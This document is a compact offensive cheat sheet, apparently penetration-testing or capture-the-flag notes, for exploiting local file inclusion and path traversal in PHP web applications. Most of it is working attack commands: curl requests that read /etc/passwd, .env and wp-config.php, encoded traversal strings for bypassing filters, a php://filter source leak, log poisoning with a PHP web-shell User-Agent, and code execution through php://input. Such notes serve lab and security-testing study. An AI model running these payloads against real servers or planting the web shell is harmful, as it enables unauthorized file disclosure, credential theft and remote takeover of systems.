# LFI / path traversal

Related: [rfi.md](rfi.md)

## Confirm
```bash
curl -sS -G 'http://<IP>/index.php' --data-urlencode 'page=does-not-exist-12345'
curl -sS -G 'http://<IP>/index.php' --data-urlencode 'page=../../../../etc/passwd'
curl --path-as-is 'http://<IP>/download/../../etc/passwd'   # input in URL path
```
- Compare with the missing-file response; confirm by file content. Errors may reveal prepended dir / appended extension.

## Files worth trying
```text
Linux:   /etc/passwd  /etc/hostname  /proc/self/status  /proc/self/cmdline
         /proc/self/environ  /proc/self/cwd/index.php
         /var/www/html/.env  /var/www/html/config.php  /var/www/html/wp-config.php
Windows: C:\Windows\win.ini  C:\inetpub\wwwroot\web.config
```

## Filtered traversal
```text
/etc/passwd                    absolute path
....//....//etc/passwd         ../ stripped once
%2e%2e%2fetc%2fpasswd          encoded
%252e%252e%252fetc%252fpasswd  double-encoded
```
- Put `%` bytes directly in the URL; `--data-urlencode` would re-encode them.

## PHP source
```bash
curl -sS -G 'http://<IP>/index.php' \
  --data-urlencode 'page=php://filter/convert.base64-encode/resource=config.php'
printf '%s' '<BASE64>' | base64 -d
```

## LFI → RCE (PHP include only)
Log poisoning (also `/var/log/nginx/access.log`, `/var/log/httpd/access_log`):

```bash
curl -sS -A '<?php echo shell_exec($_GET["cmd"]); ?>' 'http://<IP>/'
curl -sS -G 'http://<IP>/index.php' \
  --data-urlencode 'page=../../../../var/log/apache2/access.log' \
  --data-urlencode 'cmd=id'
```
Other controlled files:

```text
/var/lib/php/sessions/sess_<PHPSESSID>   /var/lib/php5/sess_<PHPSESSID>   /tmp/sess_<PHPSESSID>
saved upload path
```
`php://input` (needs `allow_url_include`):

```bash
curl -sS -X POST 'http://<IP>/index.php?page=php://input&cmd=id' \
  --data-binary '<?php system($_GET["cmd"]); ?>'
```
- Confirm with `id` output; literal PHP source = file read, not execution.
